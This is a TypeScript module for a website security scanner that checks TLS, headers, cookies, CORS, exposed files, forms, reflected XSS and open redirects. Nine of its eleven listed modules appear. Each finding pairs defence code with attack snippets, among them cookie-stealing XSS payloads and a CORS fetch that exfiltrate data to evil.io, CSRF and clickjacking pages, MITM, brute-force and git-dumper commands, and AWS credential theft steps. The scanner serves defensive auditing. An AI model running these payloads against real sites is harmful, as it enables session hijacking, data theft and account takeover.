// ARTEX Website Scanner Engine - 11 Security Modules
// Modules: TLS, Headers, Cookies, Info-Disclosure, CORS, Sensitive-Files, Forms,
//          XSS-Reflection-Probe (benign marker), Open-Redirect-Probe, DNS/Email-SEC (SPF/DMARC via DoH), Mixed-Content
// Design: single shared homepage fetch (perf) + parallel module execution + live onModule callback
import type { ScanModule, ScanFinding } from "./types";

const UA = "ARTEX-SecurityScanner/2.1";
export const MODULE_COUNT = 11;

async function safeFetch(url: string, timeoutMs = 6000, method = "GET"): Promise<{ ok: boolean; res?: Response; err?: string }> {
  try {
    const controller = new AbortController();
    const t = setTimeout(() => controller.abort(), timeoutMs);
    const res = await fetch(url, {
      method,
      redirect: "manual",
      signal: controller.signal,
      headers: { "User-Agent": UA, Accept: "*/*" },
      cache: "no-store",
    });
    clearTimeout(t);
    return { ok: true, res };
  } catch (e) {
    return { ok: false, err: e instanceof Error ? e.message : "fetch failed" };
  }
}

async function bodyOf(res: Response, max = 60000): Promise<string> {
  try {
    const text = await res.text();
    return text.slice(0, max);
  } catch {
    return "";
  }
}

function normalizeTarget(target: string): { url: string; https: string; http: string; host: string } {
  let t = target.trim();
  if (!/^https?:\/\//i.test(t)) t = "https://" + t;
  let url: URL;
  try {
    url = new URL(t);
  } catch {
    throw new Error("Invalid URL format");
  }
  // hostname sanity: dots wala domain ya IP hi allow — spaces/special chars reject
  if (!/^([a-z0-9]([a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,}$|^\d{1,3}(\.\d{1,3}){3}$|^localhost$/i.test(url.hostname)) {
    throw new Error("Invalid URL format");
  }
  const https = `https://${url.host}`;
  const http = `http://${url.host}`;
  return { url: t, https, http, host: url.host };
}

// route-level pre-validation: start event se pehle hi invalid URL reject karo
export function assertValidTarget(target: string): void {
  normalizeTarget(target);
}

function mk(id: string, name: string, icon: string, score: number, findings: ScanFinding[], summary: string): ScanModule {
  const status = score >= 80 ? "PASS" : score >= 50 ? "WARN" : "FAIL";
  return { id, name, icon, status, score: Math.max(0, Math.min(100, Math.round(score))), findings, summary };
}

const f = (
  title: string,
  severity: ScanFinding["severity"],
  detail: string,
  attack: string,
  defence: string,
  attackCode?: string,
  defenceCode?: string
): ScanFinding => ({
  title,
  severity,
  detail,
  attack,
  ...(attackCode ? { attackCode } : {}),
  defence,
  ...(defenceCode ? { defenceCode } : {}),
});

interface Shared {
  res: Response;
  body: string;
}

async function sharedHomepage(ctx: ReturnType<typeof normalizeTarget>): Promise<Shared | null> {
  const hp = await safeFetch(ctx.https);
  if (!hp.ok || !hp.res) return null;
  return { res: hp.res, body: await bodyOf(hp.res) };
}

function unreachable(id: string, name: string, icon: string): ScanModule {
  return mk(id, name, icon, 0, [], "unreachable");
}

// ---------- Module 1: TLS / HTTPS ----------
async function modTLS(ctx: ReturnType<typeof normalizeTarget>, online: boolean, shared: Shared | null): Promise<ScanModule> {
  const findings: ScanFinding[] = [];
  let score = 100;
  if (!online || !shared) {
    return mk("tls", "TLS & HTTPS", "lock", 0, [
      f(
        "Target unreachable over HTTPS",
        "HIGH",
        `Could not connect: ${online ? "homepage fetch failed (DNS/TLS/firewall)" : "offline mode"}.`,
        "ATTACK: Network-level issue ya self-signed/expired cert ho sakta hai — browser warnings user trust degrade karte hain, MITM attacks enable karte hain.",
        "DEFENCE: Valid CA certificate (Let's Encrypt free), TLS 1.2+ only, modern cipher suites (ECDHE+AESGCM/CHACHA20), OCSP stapling on karo."
      ),
    ], "HTTPS endpoint unreachable");
  }
  const hsts = shared.res.headers.get("strict-transport-security");
  if (!hsts) {
    score -= 40;
    findings.push(
      f(
        "HSTS header missing",
        "MEDIUM",
        "Strict-Transport-Security header set nahi hai.",
        "ATTACK: SSL-strip — MITM user ko http:// pe downgrade karta hai, credentials plaintext me intercept (bettercap/sslstrip style). Pehla visit vulnerable hota hai.",
        "DEFENCE: HSTS header max-age 1 saal + includeSubDomains + preload submit.",
        `# sslstrip2 attack (MITM machine pe):
bettercap -iface wlan0
> set http.proxy.sslstrip true; http.proxy on
# victim http://target.com request → https upgrade strip → creds capture
# ab first-request me browser http:// pe hi chala jata hai (no HSTS)`,
        `# nginx — server block me:
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
# + hstspreload.org pe domain submit karo (browser preload list)`
      )
    );
  }
  // http redirect check
  const httpRes = await safeFetch(ctx.http, 5000);
  if (httpRes.ok && httpRes.res && httpRes.res.status !== 301 && httpRes.res.status !== 308) {
    score -= 30;
    findings.push(
      f(
        "HTTP does not force-redirect to HTTPS",
        "HIGH",
        `http://${ctx.host} returned ${httpRes.res.status} instead of 301/308 redirect.`,
        "ATTACK: Plain-HTTP serve — attacker same network pe login form clone karke creds phish karta hai (evilginx-style reverse proxy, browser warning bhi nahi aata kyunki certificate http ka nahi hota).",
        "DEFENCE: Server-level 301 redirect + HSTS dono lagao.",
        `# verify (attacker bhi yahi dekhta hai):
curl -I http://${ctx.host}          ← 200 aaya to downgrade possible
# evilginx2 phishing proxy: victim http pe full clone site dekhta hai`,
        `# nginx:
server { listen 80; return 301 https://$host$request_uri; }
# Apache .htaccess:
RewriteEngine On
RewriteRule ^(.*)$ https://%{HTTP_HOST}/$1 [R=301,L]`
      )
    );
  }
  if (score === 100) findings.push(f("HTTPS configured correctly", "INFO", "HSTS present, redirect active.", "ATTACK: Koi obvious TLS misconfiguration nahi mili. Deeper testing: testssl.sh, SSL Labs se A+ verify karo.", "DEFENCE: Certificate auto-renewal (certbot timer) on rakho."));
  return mk("tls", "TLS & HTTPS", "lock", score, findings, `HTTPS ${shared.res.status}, HSTS: ${hsts ? "present" : "missing"}`);
}

// ---------- Module 2: Security Headers ----------
async function modHeaders(_ctx: ReturnType<typeof normalizeTarget>, online: boolean, shared: Shared | null): Promise<ScanModule> {
  const findings: ScanFinding[] = [];
  let score = 100;
  if (!online || !shared) return unreachable("headers", "Security Headers", "shield");
  const h = shared.res.headers;
  const checks: Array<[string, string, number, ScanFinding["severity"], string, string, string, string]> = [
    ["content-security-policy", "Content-Security-Policy", 30, "HIGH",
      "ATTACK: Bina CSP ke injected <script src=//evil.io/x.js> chal jayega — stored XSS full impact ke saath execute, inline onerror/onload handlers bhi free run karte hain.",
      "DEFENCE: CSP nonce-based script-src + object-src none + frame-ancestors none. Pehle Content-Security-Policy-Report-Only me test karo.",
      `# stored XSS bina CSP ke — comment/profile me:
<script src="https://evil.io/x.js"></script>
<img src=x onerror="fetch('//evil.io?c='+document.cookie)">
# CSP hone pe ye scripts BLOCK ho jati (nonce ke bina)`,
      `# nginx:
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-RANDOM'; object-src 'none'; frame-ancestors 'none'; base-uri 'none'" always;
# PHP: header("Content-Security-Policy: ...");
# test mode: Content-Security-Policy-Report-Only + report-uri`],
    ["x-content-type-options", "X-Content-Type-Options", 15, "MEDIUM",
      "ATTACK: MIME-sniffing — attacker upload ko .jpg naam se bhejta hai, browser use HTML/JS samajh ke execute kar deta hai (IE/old Edge classic).",
      "DEFENCE: nosniff header sab responses pe — ek line, zero cost.",
      `# payload: HTML/JS content ko .jpg naam se upload karo
curl -F 'f=@payload.jpg' https://target.com/upload
# nosniff absent → browser content sniff karke JS execute kar sakta hai`,
      `add_header X-Content-Type-Options "nosniff" always;`],
    ["x-frame-options", "X-Frame-Options / frame-ancestors", 15, "MEDIUM",
      "ATTACK: Clickjacking — transparent iframe me 'Delete Account' button overlay karke user clicks social-engineer karo (z-index + opacity:0 trick).",
      "DEFENCE: X-Frame-Options DENY + CSP frame-ancestors 'none' — dono lagao.",
      `<!-- attacker page — victim isko kholta hai -->
<div style="position:absolute;opacity:0;z-index:99">
  <iframe src="https://target.com/settings/delete-account" width=800 height=600></iframe>
</div>
<button style="position:absolute;top:300px;left:400px">JEETO PRIZE CLICK KARO</button>`,
      `add_header X-Frame-Options "DENY" always;
# CSP me bhi: frame-ancestors 'none';`],
    ["referrer-policy", "Referrer-Policy", 10, "LOW",
      "ATTACK: Referrer leak — URL me session/reset token ho to third-party analytics se leak hota hai.",
      "DEFENCE: strict-origin-when-cross-origin ya no-referrer.",
      `# external link se analytics server ko pura URL milta hai:
Referer: https://target.com/reset-password?token=SECRET123
# token ab third-party ke logs me hai`,
      `add_header Referrer-Policy "strict-origin-when-cross-origin" always;`],
    ["permissions-policy", "Permissions-Policy", 10, "LOW",
      "ATTACK: Bina policy ke malicious embeds camera/geolocation/mic access request kar sakte hain.",
      "DEFENCE: Permissions-Policy me sab sensitive features deny.",
      `# malicious iframe camera permission prompt trigger karta hai:
<iframe src="https://target.com" allow="camera; microphone">`,
      `add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()" always;`],
    ["x-powered-by", "X-Powered-By (disclosure)", 10, "LOW",
      "ATTACK: Tech fingerprint — 'PHP/7.4.3' dikha to attacker us version ke known CVEs (PHP-FPM RCE CVE-2019-11043) directly try karta hai.",
      "DEFENCE: header_remove + expose_php Off + server_tokens off.",
      `curl -sI https://target.com | grep -i 'x-powered-by|server'
# → X-Powered-By: PHP/7.4.3  → exploit-db pe CVE search → direct exploit`,
      `// PHP: header_remove('X-Powered-By'); + php.ini: expose_php = Off
// nginx: server_tokens off;   Apache: ServerTokens Prod`],
    ["server", "Server banner (disclosure)", 10, "LOW",
      "ATTACK: 'Apache/2.4.49' banner dikhe to attacker path-traversal CVE-2021-41773 directly exploit karta hai.",
      "DEFENCE: Version strings hide karo server config me.",
      `curl -sI https://target.com | grep -i '^server'
# → Server: Apache/2.4.49  → CVE-2021-41773 path traversal ready`,
      `# nginx: server_tokens off;
# Apache: ServerTokens Prod + ServerSignature Off`],
  ];
  for (const [key, label, penalty, sev, attack, defence, attackCode, defenceCode] of checks) {
    const val = h.get(key);
    const isDisclosure = key === "x-powered-by" || key === "server";
    if (isDisclosure ? val !== null : val === null) {
      score -= penalty;
      findings.push(
        f(
          isDisclosure ? `${label} exposed` : `${label} missing`,
          sev,
          isDisclosure ? `Header value: "${val}"` : `${label} header response me nahi mila.`,
          attack,
          defence,
          attackCode,
          defenceCode
        )
      );
    }
  }
  if (score === 100) findings.push(f("All security headers present", "INFO", "CSP, nosniff, frame-options, referrer-policy sab set hain.", "ATTACK: Standard header attacks blocked hain.", "DEFENCE: CSP ko report-uri/csp.dev se monitor karte raho."));
  return mk("headers", "Security Headers", "shield", score, findings, `${checks.length} headers audited`);
}

// ---------- Module 3: Cookie Security ----------
async function modCookies(_ctx: ReturnType<typeof normalizeTarget>, online: boolean, shared: Shared | null): Promise<ScanModule> {
  const findings: ScanFinding[] = [];
  let score = 100;
  if (!online || !shared) return unreachable("cookies", "Cookie Security", "cookie");
  const raw = shared.res.headers.getSetCookie?.() ?? [];
  if (raw.length === 0) {
    findings.push(f("No cookies on landing page", "INFO", "Response me Set-Cookie nahi mila (static page ho sakta hai).", "ATTACK: Login/auth flows pe deep cookie audit karna hoga.", "DEFENCE: Session cookies ke liye Secure+HttpOnly+SameSite=Lax mandatory rakho."));
    return mk("cookies", "Cookie Security", "cookie", 90, findings, "no cookies observed");
  }
  for (const c of raw) {
    const name = c.split("=")[0]?.trim() || "cookie";
    const lc = c.toLowerCase();
    if (!lc.includes("httponly")) {
      score -= 30;
      findings.push(f(`Cookie "${name}" missing HttpOnly`, "HIGH", c.slice(0, 120),
        "ATTACK: XSS se document.cookie JS-accessible hai — session hijack turant.",
        "DEFENCE: HttpOnly flag har session cookie pe — JS access blocked.",
        `# XSS payload jo cookie chura lega (HttpOnly missing ho to):
<img src=x onerror="fetch('//evil.io/?c='+document.cookie)">
# stolen cookie browser devtools me set karo → victim ki full session`,
        `setcookie($name, $val, ['httponly' => true, 'secure' => true, 'samesite' => 'Lax']);
// php.ini: session.cookie_httponly = 1`));
    }
    if (!lc.includes("secure")) {
      score -= 25;
      findings.push(f(`Cookie "${name}" missing Secure`, "HIGH", c.slice(0, 120),
        "ATTACK: Same WiFi MITM — cookie plaintext HTTP request me leak, session steal.",
        "DEFENCE: Secure flag + force HTTPS + HSTS.",
        `# MITM (same network):
arpspoof -i wlan0 -t VICTIM_IP GATEWAY_IP
# wireshark filter: http.cookie contains "${name}"
# plaintext cookie packet me dikh jayegi`,
        `setcookie($name, $val, ['secure' => true]);
// + HTTP→HTTPS 301 redirect + HSTS mandatory`));
    }
    if (!lc.includes("samesite")) {
      score -= 20;
      findings.push(f(`Cookie "${name}" missing SameSite`, "MEDIUM", c.slice(0, 120),
        "ATTACK: Cross-site request pe cookie auto-attach hoti hai — CSRF attacks easy.",
        "DEFENCE: SameSite=Lax (ya Strict auth-critical cookies pe).",
        `<!-- attacker page auto-submit karta hai → cookie attach ho ke request jaati hai -->
<form action="https://target.com/transfer" method="POST"><input name=to value=attacker></form>
<script>document.forms[0].submit()</script>`,
        `setcookie($name, $val, ['samesite' => 'Lax']);
// auth-critical: 'Strict'`));
    }
  }
  if (score === 100) findings.push(f("Cookies properly flagged", "INFO", "Secure + HttpOnly + SameSite sab present.", "ATTACK: Flag-level attacks blocked.", "DEFENCE: Session rotation on login/logout bhi implement karo."));
  return mk("cookies", "Cookie Security", "cookie", score, findings, `${raw.length} cookie(s) analyzed`);
}

// ---------- Module 4: Info Disclosure (FIXED: proper verbose-error check) ----------
async function modInfo(_ctx: ReturnType<typeof normalizeTarget>, online: boolean, shared: Shared | null): Promise<ScanModule> {
  const findings: ScanFinding[] = [];
  let score = 100;
  if (!online || !shared) return unreachable("info", "Info Disclosure", "eye");
  const body = shared.body;
  if (/generator["'\s=]+(WordPress\s[\d.]+|Drupal\s\d+)/i.test(body)) {
    score -= 20;
    findings.push(f("CMS version leaked in <meta generator>", "MEDIUM", "Page source me CMS version exposed.",
      "ATTACK: WordPress 5.x known CVE list (REST user enum, plugin RCEs) directly apply.",
      "DEFENCE: Version hiding + core/plugins auto-update on.",
      `wpscan --url https://target.com --enumerate vp,ap,u --api-token WPTOKEN
# vulnerable plugins + users list — exploit-db mapping
# version hide (functions.php): remove_action('wp_head','wp_generator');`,
      `remove_action('wp_head','wp_generator');
// + wp-config: define('DISALLOW_FILE_EDIT', true);
// + auto-update: add_filter('auto_update_plugin', '__return_true');`));
  }
  if (/\/wp-content\//i.test(body)) {
    score -= 10;
    findings.push(f("WordPress paths exposed", "LOW", "wp-content references found.", "ATTACK: wpscan --url target --enumerate vp,ap,u se vulnerable plugins + users enumerate karo.", "DEFENCE: wp-admin pe 2FA + rate limiting, XML-RPC disable karo."));
  }
  // FIXED: real verbose-error signature check on actual body
  const verboseError = /(?:fatal error|parse error|stack trace|warning:\s|notice:\s|exception:|debug backtrace|on line \d+|\/var\/www|\/home\/[a-z0-9_]+\/|\.php on line)/i.test(body);
  if (verboseError) {
    score -= 15;
    findings.push(f("Verbose error/debug output in page", "MEDIUM", "Response body me stack-trace / path / line-number signatures mile.",
      "ATTACK: Stack traces se file paths, DB creds, library versions leak — exact CVE matching possible.",
      "DEFENCE: display_errors Off, log_errors On, generic 500 page.",
      `# trigger karo:
curl 'https://target.com/item.php?id=1%27'
# response: Fatal error: ... in /var/www/html/lib/db.php on line 42
# → path leak + SQL query + library version`,
      `// php.ini: display_errors = Off; log_errors = On;
// custom handler:
set_exception_handler(function ($e) {
    error_log($e);
    http_response_code(500);
    exit('Internal error');   // user ko kuch nahi dikhta
});`));
  }
  if (/artex|scan-area|test-page/i.test(body) === false && /<!--\s*(comment|TODO|FIXME|HACK)/i.test(body)) {
    score -= 5;
    findings.push(f("Developer comments exposed", "LOW", "HTML comments with TODO/FIXME markers.", "ATTACK: Comments me internal endpoints, credentials hints, architecture details milte hain.", "DEFENCE: Build pipeline me HTML comments strip karo (minification)."));
  }
  if (score === 100) findings.push(f("No obvious info leaks", "INFO", "Generator/version strings clean.", "ATTACK: Fingerprinting harder — attacker manual recon karega (DNS history, cert transparency).", "DEFENCE: crt.sh pe apna subdomain audit karo, staging domains hatao."));
  return mk("info", "Info Disclosure", "eye", score, findings, "landing page fingerprinted");
}

// ---------- Module 5: CORS ----------
async function modCORS(ctx: ReturnType<typeof normalizeTarget>, online: boolean, shared: Shared | null): Promise<ScanModule> {
  const findings: ScanFinding[] = [];
  let score = 100;
  if (!online || !shared) return unreachable("cors", "CORS Policy", "globe");
  const h = shared.res.headers;
  const acao = h.get("access-control-allow-origin");
  const acac = h.get("access-control-allow-credentials");
  if (acao === "*") {
    if (acac === "true") {
      score = 0;
      findings.push(f("DANGEROUS: ACAO=* with credentials", "CRITICAL", "Wildcard origin + allow-credentials combo (invalid but dangerous).",
        "ATTACK: Cross-origin fetch with credentials — attacker.com se victim ki authenticated API data read.",
        "DEFENCE: Wildcard + credentials combo kabhi nahi — explicit origin whitelist.",
        `// evil.com pe — victim logged-in browser se:
fetch('https://${ctx.host}/api/wallet', {credentials: 'include'})
  .then(r => r.text()).then(d => fetch('https://evil.io/exfil', {method:'POST', body:d}));
// victim ka wallet data attacker ke server pe`,
      `$allow = ['https://app.trusted.com'];
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
if (in_array($origin, $allow, true)) {
    header('Access-Control-Allow-Origin: ' . $origin);
    header('Access-Control-Allow-Credentials: true');
    header('Vary: Origin');
}`));
    } else {
      score -= 50;
      findings.push(f("CORS wildcard: Access-Control-Allow-Origin: *", "MEDIUM", "Koi bhi origin public data read kar sakta hai.", "ATTACK: Agar endpoint sensitive/parity me hai to attacker site victim ke browser se data pull kar sakti hai (credentials na ho tab bhi IP-internal data).", "DEFENCE: Wildcard hatao, explicit origins whitelist karo."));
    }
  } else if (acao && acao !== ctx.url) {
    score -= 20;
    findings.push(f("CORS reflects specific origin", "LOW", `ACAO: ${acao}`, "ATTACK: Origin reflection + credentials wale endpoints subdomain takeover ke saath combine hote hain.", "DEFENCE: Null origin, subdomain wildcards check karo."));
  } else if (!acao) {
    findings.push(f("CORS not configured (browser default)", "INFO", "No ACAO header — same-origin policy default blocked.", "ATTACK: CORS-level cross-origin reads blocked.", "DEFENCE: Theek hai — API public na ho to aisa hi rakhna."));
  }
  return mk("cors", "CORS Policy", "globe", score, findings, acao ? `ACAO: ${acao}` : "no ACAO header");
}

// ---------- Module 6: Sensitive Files / Attack Surface ----------
async function modSensitive(ctx: ReturnType<typeof normalizeTarget>, online: boolean): Promise<ScanModule> {
  const findings: ScanFinding[] = [];
  let score = 100;
  const probes: Array<[string, string, ScanFinding["severity"], string, string, string]> = [
    ["/.env", "Environment file exposed", "CRITICAL",
      "ATTACK: GET /.env — APP_KEY, DB_PASSWORD, AWS_ACCESS_KEY_ID, SMTP creds milte hain. AWS keys se S3/EC2 takeover, DB creds se full data dump.",
      "DEFENCE: .env webroot ke BAHAR + deny rule server config me.",
      `curl -s https://target.com/.env
# APP_KEY=base64:...  DB_PASSWORD=...  AWS_ACCESS_KEY_ID=AKIA...
# AWS key mila to: aws s3 ls s3://company-backups --no-sign-request nahi —
# aws configure + s3 sync → full cloud takeover`],
    ["/.git/HEAD", "Git repository exposed", "CRITICAL",
      "ATTACK: .git directory public — pura source code, config, credentials history ke saath download.",
      "DEFENCE: .git webroot me deploy na karo + deny rule.",
      `git-dumper https://target.com/.git ./dump
cd dump && git log --oneline   # pura history
grep -rEi 'password|secret|api_key' .   # creds mil jate hain`],
    ["/.aws/credentials", "AWS credentials file exposed", "CRITICAL",
      "ATTACK: access key + secret key plaintext → S3 enumerate, EC2 metadata, full cloud account takeover (IAM escalation).",
      "DEFENCE: Credentials webroot me kabhi nahi; keys rotate + CloudTrail alerts.",
      `curl -s https://target.com/.aws/credentials
# [default]\naws_access_key_id = AKIA...\naws_secret_access_key = ...
aws s3 ls --profile stolen   # enumerate → sync exfil`],
    ["/phpinfo.php", "phpinfo() page exposed", "HIGH",
      "ATTACK: phpinfo se server paths, loaded extensions, POST limit, disable_functions — full recon in one page.",
      "DEFENCE: Production me phpinfo() kabhi expose na karo.",
      `curl -s https://target.com/phpinfo.php | grep -Ei 'DOCUMENT_ROOT|VERSION|disable_functions|_ENV'`],
    ["/adminer.php", "Adminer DB tool exposed", "HIGH",
      "ATTACK: Open Adminer = DB login screen kisi bhi ke liye — brute force + default creds + SSRF-via-connection.",
      "DEFENCE: Adminer production se delete; chahiye to IP allowlist + auth ke peeche.",
      `curl -s https://target.com/adminer.php | head -5
# Adminer login page → hydra brute force ya SSRF (connect to internal host)`],
    ["/admin/", "Admin panel exposed", "MEDIUM",
      "ATTACK: /admin/ reachable — brute force, default creds admin:admin, CVE-based login bypass.",
      "DEFENCE: VPN/IP whitelist + 2FA + rate limiting + WAF challenge.",
      `hydra -L users.txt -P pass.txt target.com https-form-post "/admin/login:user=^USER^&pass=^PASS^:F=incorrect"
# ya default creds: admin:admin, admin:password123`],
    ["/backup.zip", "Backup file exposed", "CRITICAL",
      "ATTACK: /backup.zip, /site.tar.gz, /dump.sql download — pura source + DB dump public.",
      "DEFENCE: Backups webroot se bahar + deny rule (robots.txt hint bhi na de).",
      `curl -sO https://target.com/backup.zip && unzip backup.zip
# pura source + config + kabhi DB dump bhi`],
    ["/composer.json", "composer.json exposed", "MEDIUM",
      "ATTACK: Dependency list dekh ke known-vulnerable package versions target karo.",
      "DEFENCE: Webroot se hatao + 'composer audit' regularly chalao.",
      `curl -s https://target.com/composer.json | jq .require
# laravel/framework: ^8.0 → known CVEs check karo`],
    ["/wp-login.php", "WordPress login exposed", "LOW",
      "ATTACK: Credential stuffing + xmlrpc.php amplification DDoS.",
      "DEFENCE: Limit login attempts, 2FA, xmlrpc disable.",
      `wpscan --url https://target.com --passwords rockyou.txt --usernames admin
# xmlrpc amplification: system.multicall se 100x password guesses`],
  ];
  if (!online) return unreachable("sensitive", "Sensitive Files", "folder-search");
  const results = await Promise.all(
    probes.map(async ([path]) => ({ path, res: await safeFetch(ctx.https + path, 4000) }))
  );
  for (let i = 0; i < probes.length; i++) {
    const [, title, sev, attack, defence, attackCode] = probes[i];
    const { path, res } = results[i];
    if (res.ok && res.res && res.res.status === 200) {
      const body = await bodyOf(res.res!, 400);
      // avoid soft-404: SPA index served for everything (admin panels are real HTML, keep them)
      const soft404 = body.length > 200 && /<html|<!doctype/i.test(body) && !title.includes("admin");
      if (!soft404) {
        score -= sev === "CRITICAL" ? 40 : sev === "HIGH" ? 25 : 15;
        findings.push(f(title, sev, `Found at ${path} (HTTP 200)`, attack, defence, attackCode));
      }
    }
  }
  if (score === 100) findings.push(f("No sensitive files exposed", "INFO", "Common leak paths clean.", "ATTACK: Basic file exposure vectors blocked.", "DEFENCE: Dirb/gobuster se deeper wordlist audit karo internal network se."));
  return mk("sensitive", "Sensitive Files", "folder-search", score, findings, `${probes.length} paths probed`);
}

// ---------- Module 7: Forms & Input Security ----------
async function modForms(_ctx: ReturnType<typeof normalizeTarget>, online: boolean, shared: Shared | null): Promise<ScanModule> {
  const findings: ScanFinding[] = [];
  let score = 100;
  if (!online || !shared) return unreachable("forms", "Forms & Inputs", "file-input");
  const body = shared.body;
  const forms = (body.match(/<form[\s>]/gi) ?? []).length;
  if (forms === 0) {
    findings.push(f("No forms on landing page", "INFO", "Static landing page — form-level CSRF/XSS audit deeper pages pe karna hoga.", "ATTACK: Crawl karo: hakrawler, katana se form endpoints collect karo, har form pe CSRF/XSS test.", "DEFENCE: Har state-changing form pe CSRF token + input validation server-side."));
    return mk("forms", "Forms & Inputs", "file-input", 95, findings, "no forms found on landing page");
  }
  const hasCsrfField = /name=["']?(csrf|_token|authenticity_token|token)["']?/i.test(body);
  if (!hasCsrfField) {
    score -= 35;
    findings.push(f("Forms without CSRF token field", "HIGH", `${forms} form(s) found, koi CSRF token field nahi.`,
      "ATTACK: Auto-submitting cross-site form se victim ki taraf se actions (transfer, email change) execute karo.",
      "DEFENCE: Session CSRF token + hash_equals verify; SameSite=Lax cookies.",
      `<!-- attacker.html — victim browser me auto-submit -->
<html><body onload="document.f.submit()">
<form name="f" action="https://target.com/account/email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.io">
</form></body></html>`,
      `// PHP: token generate + verify (har state-changing form pe)
session_start();
$_SESSION['csrf'] ??= bin2hex(random_bytes(32));
// form: <input type="hidden" name="csrf" value="<?= htmlspecialchars($_SESSION['csrf']) ?>">
if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) { http_response_code(403); exit; }`));
  }
  if (/action=["']http:\/\//i.test(body)) {
    score -= 20;
    findings.push(f("Form posts over HTTP", "HIGH", "Form action plain HTTP pe hai.", "ATTACK: MITM form data interception (creds in cleartext).", "DEFENCE: Action URL https:// karo + HSTS."));
  }
  if (/autocomplete=["']?on/i.test(body) && /type=["']?password/i.test(body)) {
    score -= 10;
    findings.push(f("Password field allows autocomplete", "LOW", "autocomplete=on on password input.", "ATTACK: Shared/kiosk systems me saved passwords leak.", "DEFENCE: autocomplete='new-password' / 'off' sensitive fields pe."));
  }
  if (score === 100) findings.push(f("Forms look configured", "INFO", "CSRF fields present, HTTPS actions.", "ATTACK: Manual testing still recommended.", "DEFENCE: Rate-limit login/register endpoints."));
  return mk("forms", "Forms & Inputs", "file-input", score, findings, `${forms} form(s) audited`);
}

// ---------- Module 8: XSS Reflection Probe (BENIGN marker — ethical DAST) ----------
async function modXssReflect(ctx: ReturnType<typeof normalizeTarget>, online: boolean): Promise<ScanModule> {
  const findings: ScanFinding[] = [];
  if (!online) return unreachable("xssr", "XSS Reflection Probe", "crosshair");
  // Completely harmless marker string — koi executable payload nahi
  const marker = "artexR9zprobe";
  const payload = `${marker}<b>probe</b>`;
  const res = await safeFetch(`${ctx.https}/?artex_probe=${encodeURIComponent(payload)}`, 5000);
  if (!res.ok || !res.res || res.res.status >= 500) {
    findings.push(f("Probe request failed", "INFO", "Endpoint ne probe accept nahi kiya (WAF/block/5xx) — manual testing karo.", "ATTACK: WAF reflection block kar raha hai — encoder variations (double-encode, case-shift) se differential testing karo.", "DEFENCE: WAF rule tune karo aur phir bhi output-encoding server-side rakho — WAF single layer hai."));
    return mk("xssr", "XSS Reflection Probe", "crosshair", 100, findings, "probe skipped");
  }
  const body = await bodyOf(res.res, 80000);
  if (body.includes(payload)) {
    findings.push(
      f("Reflected UNENCODED input in response", "HIGH",
        `Probe marker "${payload}" raw bina encoding ke wapas mila — query params output-encode nahi hote.`,
        "ATTACK: Yahi reflection HTML context me real XSS bhi reflect karegi — ?param=<svg onload=alert(1)> browser me execute hoga (authorized test me sirf alert-level payload use karo).",
        "DEFENCE: Output-time context-aware escape + template engine auto-escape ON + CSP.",
        `# verify karo (sirf harmless alert — authorization ke saath):
https://target.com/?artex_probe=<svg onload=alert(document.domain)>
# agar alert popup aaya = exploitable reflected XSS`,
        `echo htmlspecialchars($v, ENT_QUOTES, 'UTF-8');   // har output pe
// Twig/Blade auto-escape default ON rakho
// + CSP: script-src 'self' — inline exec blocked`)
    );
    return mk("xssr", "XSS Reflection Probe", "crosshair", 25, findings, "UNENCODED reflection detected");
  }
  if (body.includes(marker)) {
    findings.push(f("Input reflected but encoded", "INFO", "Marker mila par HTML-encoded form me (<b> escaped) — sanitizer active hai.", "ATTACK: Encoding bypass variants: nested contexts (JS string me HTML), attribute-broken quotes, double-decode servers.", "DEFENCE: Encoding context-wise rakho — HTML/attr/JS/URL sab alag escape functions."));
    return mk("xssr", "XSS Reflection Probe", "crosshair", 100, findings, "reflection encoded ✓");
  }
  findings.push(f("Input not reflected", "INFO", "Probe marker response me nahi mila — landing page reflection point nahi (deeper pages pe crawl karo).", "ATTACK: Crawler (katana/hakrawler) se sab GET-param endpoints collect karke har page pe reflection test karo.", "DEFENCE: Sab endpoints pe consistent output encoding policy rakho."));
  return mk("xssr", "XSS Reflection Probe", "crosshair", 100, findings, "no reflection on landing page");
}

// ---------- Module 9: Open Redirect Probe (benign) ----------
async function modRedirect(ctx: ReturnType<typeof normalizeTarget>, online: boolean): Promise<ScanModule> {
  const findings: ScanFinding[] = [];
  let score = 100;
  if (!online) return unreachable("oredir", "Open Redirect Probe", "external-link");
  const PARAMS = ["next", "redirect", "url", "return", "goto", "redirect_uri"];
  const PROBE = "https://example.com/artex-ok";
  const results = await Promise.all(
    PARAMS.map(async (p) => ({ p, res: await safeFetch(`${ctx.https}/?${p}=${encodeURIComponent(PROBE)}`, 3500) }))
  );
  const vulnerable: string[] = [];
  for (const { p, res } of results) {
    if (res.ok && res.res) {
      const st = res.res.status;
      const loc = res.res.headers.get("location") ?? "";
      if (st >= 300 && st < 400 && loc.includes("example.com")) vulnerable.push(p);
    }
  }
  if (vulnerable.length > 0) {
    score = 20;
    findings.push(
      f(`Open redirect via ?${vulnerable[0]}`, "HIGH",
        `Param(s) ${vulnerable.map((v) => "?" + v).join(", ")} se server example.com pe 3xx redirect karta hai — unvalidated destination.`,
        "ATTACK: Phishing — URL legit domain ka dikh raha hai, email campaign me trust badh jata hai. OAuth apps me redirect_uri abuse se authorization codes hijack.",
        "DEFENCE: Redirect destinations whitelist ya relative-path-only rule.",
        `# phishing URL (legit wrapper):
https://${ctx.host}/?${vulnerable[0]}=https://evil-phish.io/login-clone
curl -sI "https://${ctx.host}/?${vulnerable[0]}=https://example.com" | grep -i location
# 302 → https://example.com  confirm ho gaya`,
        `$next = $_GET['next'] ?? '/dashboard';
$allowed = ['/dashboard', '/profile', '/home'];
if (!in_array($next, $allowed, true)) { $next = '/dashboard'; }
header('Location: ' . $next); exit;
// ya: preg_match('#^/[a-z]#i', $next) && !str_contains($next, '//')`)
    );
  } else {
    findings.push(f("No open redirect on common params", "INFO", "next/redirect/url/return/goto/redirect_uri params pe unvalidated redirect nahi mila.", "ATTACK: Deep-link params (protected paths ke redirect-after-login) pe manually test karo.", "DEFENCE: Redirect-after-login bhi whitelist pattern follow kare."));
  }
  return mk("oredir", "Open Redirect Probe", "external-link", score, findings, `${PARAMS.length} redirect params probed`);
}

